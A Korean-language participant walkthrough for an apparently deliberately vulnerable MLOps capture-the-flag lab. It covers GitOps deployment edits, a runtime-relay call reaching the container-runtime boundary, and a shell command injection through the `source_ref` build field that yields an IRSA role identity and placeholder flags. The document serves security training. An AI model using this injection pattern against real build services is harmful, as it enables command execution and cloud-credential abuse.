# Stage 5-A Runtime / 5-B IAM 참가자 PoC 보충

Stage 1~3은 [`PARTICIPANT_POC.md`](PARTICIPANT_POC.md)의 공개 ModelGate
절차를 따른다. 이 문서는 Stage 4 이후의 두 독립적인 최종 문제를 설명한다.
참가자는 공개 ModelGate EIP와 proof-bound Git gateway만 사용한다. `kubectl`과
AWS profile은 운영자 진단/초기화에만 사용한다.

## Stage 4: Git에서 기존 앱 프로필 활성화

Stage 3의 credential로 `stage4-lab` 브랜치를 clone한다. 허용된
`runtime-builder/README.md`와 `runtime-builder/deployment.yaml`을 읽는다.
README는 `source_ref`가 셸 명령에 조합되는 legacy resolver와 앱의 제한된
IRSA/S3 proof를 설명한다. Deployment의 Pod template에
`lab.vuln-mlops/stage-04-proof: FLAG{stage_4_gitops_placeholder}` annotation을
추가하고 기존 `STAGE4_MODE=git-controlled`, `STAGE5_MODE=iam-build`,
`BUILDER_MODE=legacy-build` 값으로 변경한다. Image, ServiceAccount, node selector,
volume과 권한은 변경하지 않는다. 변경을 push하고 ModelGate의
`$API/stage-04/application`에서 새 revision, `Synced/Healthy`, Stage 4 proof와
`runtime_relay`와 `builder_endpoint`를 확인한다. 두 경로는 Stage 4 proof를
공유하지만 서로의 Flag를 요구하지 않는다.

## Stage 5-A: 고정 runtime 작업으로 노드 경계 확인

Gitea README와 Stage 4 application status는 별도 `runtime-maintenance` 에이전트의
고정 runtime 경로를 알려준다. 에이전트는 전용 escape worker에만 배치되고
IRSA 역할이나 Kubernetes token을 갖지 않는다. 공개 요청은 Git으로 활성화된
builder를 통해서만 전달되며 ModelGate에서 에이전트로 직접 연결하지 않는다.

```bash
STATUS_JSON=$(curl -fsS "$API/stage-04/application")
printf '%s' "$STATUS_JSON" | "$PY" -m json.tool
RELAY_PATH=$(printf '%s' "$STATUS_JSON" | "$PY" -c \
  'import json,sys; print(json.load(sys.stdin)["runtime_relay"])')
curl -fsS -X POST "$BASE$RELAY_PATH" | "$PY" -m json.tool
```

기대 증거는 고정 CRI 작업의 성공과 `FLAG{stage_5_node_placeholder}`다.
요청에는 body·명령·이미지·경로·Pod 이름을 넣지 않는다. 이 문제는
containerd runtime 경계 접근과 합성 노드 파일 조회를 보이며 임의 노드
명령권이나 완전한 노드 장악을 주장하지 않는다.

## Stage 5-B: build 입력에서 합성 IAM proof까지

아래 명령은 이전 단계에서 `BASE`, `API`, `PY` 변수가 설정됐다고 가정한다.

```bash
STATUS_JSON=$(curl -fsS "$API/stage-04/application")
BUILDER_PATH=$(printf '%s' "$STATUS_JSON" | "$PY" -c \
  'import json,sys; print(json.load(sys.stdin)["builder_endpoint"])')
BUILD_INFO=$(curl -fsS "$BASE$BUILDER_PATH")
printf '%s' "$BUILD_INFO" | "$PY" -m json.tool
BUILD_PATH=$(printf '%s' "$BUILD_INFO" | "$PY" -c \
  'import json,sys; print(json.load(sys.stdin)["next"])')

curl -sS -o /tmp/stage5-before.json -w 'before_http=%{http_code}\n' \
  "$API/stage-05/aws-proof"

curl -fsS -X POST "$BASE$BUILD_PATH" \
  -H 'Content-Type: application/json' \
  --data '{"source_ref":"main; cd /opt/modelgate && python -m runtime_builder.aws_proof; #"}' \
  | "$PY" -m json.tool

curl -fsS "$API/stage-05/aws-proof" | "$PY" -m json.tool
```

기대 결과는 실행 전 HTTP 404, build `completed`, 이후 예상 계정,
`assumed-role/...runtime-builder/...` ARN과 합성 Flag다. build subprocess의
작업 디렉터리는 `/tmp`다. 따라서 `cd /opt/modelgate` 없이
`python -m runtime_builder.aws_proof`만 실행하면 Python이 앱 모듈을 찾지 못해
`failed`가 반환된다. 앱은 셸 출력·AWS credential·임의 파일을 응답하지 않는다.
이 결과는 Pod 앱의 IRSA를 통한 실습용 S3 객체 읽기를 증명하며 노드 장악의
증거는 아니다.
